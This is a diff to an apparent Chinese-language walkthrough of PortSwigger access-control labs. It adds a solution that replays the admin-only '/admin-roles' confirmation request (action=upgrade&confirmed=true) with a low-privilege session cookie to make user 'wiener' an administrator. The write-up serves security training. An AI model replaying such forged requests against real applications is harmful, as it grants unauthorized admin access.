@@ -281,6 +281,58 @@ Hal Pline: Do one!
 
 用 `carlos` 搭配上面的密碼 `f2fywx70d8le7bvr3z8u` 登入即可
 
+## [Lab: Multi-step process with no access control on one step ](https://portswigger.net/web-security/access-control/lab-multi-step-process-with-no-access-control-on-one-step)
+
+### 題目敘述
+ This lab has an admin panel with a flawed multi-step process for changing a user's role. You can familiarize yourself with the admin panel by logging in using the credentials administrator:admin.
+
+To solve the lab, log in using the credentials wiener:peter and exploit the flawed access controls to promote yourself to become an administrator. 
+### 題目解釋
+
+### 解答
+
+登 Admin 帳號測試，送出之後會多一個 `Are you sure?`，按 Yes 後再抓包
+
+```
+POST /admin-roles HTTP/1.1
+Host: ac381f941e9b5529c02776c9007c0068.web-security-academy.net
+Cookie: session=zNyzlTvxi4vdvfVwFsoIx0bHSoYXcquy
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 45
+Origin: https://ac381f941e9b5529c02776c9007c0068.web-security-academy.net
+Referer: https://ac381f941e9b5529c02776c9007c0068.web-security-academy.net/admin-roles
+Upgrade-Insecure-Requests: 1
+Te: trailers
+Connection: close
+
+action=upgrade&confirmed=true&username=carlos
+```
+
+觀察一下，直接送會沒有帶 `confirmed=true`
+
+登入低權限使用者後，複製 Session 貼到符合上面格式
+```
+POST /admin-roles HTTP/1.1
+Host: ac381f941e9b5529c02776c9007c0068.web-security-academy.net
+Cookie: session=8vblJuYQSnvxbxZJkoeQV9zbLfG4D4nA
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 45
+Origin: https://ac381f941e9b5529c02776c9007c0068.web-security-academy.net
+Referer: https://ac381f941e9b5529c02776c9007c0068.web-security-academy.net/admin-roles
+Upgrade-Insecure-Requests: 1
+Te: trailers
+Connection: close
+
+action=upgrade&confirmed=true&username=wiener
+```
 
 ## [Lab: Referer-based access control ](https://portswigger.net/web-security/access-control/lab-referer-based-access-control)
 
@@ -290,7 +342,7 @@ Hal Pline: Do one!
 To solve the lab, log in using the credentials wiener:peter and exploit the flawed access controls to promote yourself to become an administrator. 
 
 ### 題目解釋
-
+題目是說注意 Referer，但我覺得就是注意想辦法發跟正常完全一樣的封包就對ㄌ
 
 ### 解答
 
